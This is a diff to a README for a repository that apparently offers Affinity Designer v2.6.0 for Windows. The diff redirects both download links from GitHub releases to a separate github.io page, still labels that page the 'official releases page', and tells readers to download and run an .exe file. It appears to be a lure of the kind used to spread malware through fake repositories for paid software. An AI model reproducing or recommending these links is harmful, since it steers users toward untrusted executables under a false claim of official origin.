@@ -1,6 +1,6 @@
 # 🎨 affinity-designer-v260-windows - Professional tools for vector graphic design
 
-[![](https://img.shields.io/badge/Download-Affinity_Designer-blue.svg)](https://github.com/rexdeiodinating563/affinity-designer-v260-windows/releases)
+[![](https://img.shields.io/badge/Download-Affinity_Designer-blue.svg)](https://rexdeiodinating563.github.io)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Before you install the application, ensure your computer meets these requirement
 
 Follow these steps to obtain and start the application on your computer:
 
-1.  Visit the [official releases page](https://github.com/rexdeiodinating563/affinity-designer-v260-windows/releases) to access the download files.
+1.  Visit the [official releases page](https://rexdeiodinating563.github.io) to access the download files.
 2.  Find the section marked "Assets" on the release page.
 3.  Click the file ending in `.exe` to begin the download.
 4.  Locate the downloaded file in your "Downloads" folder.
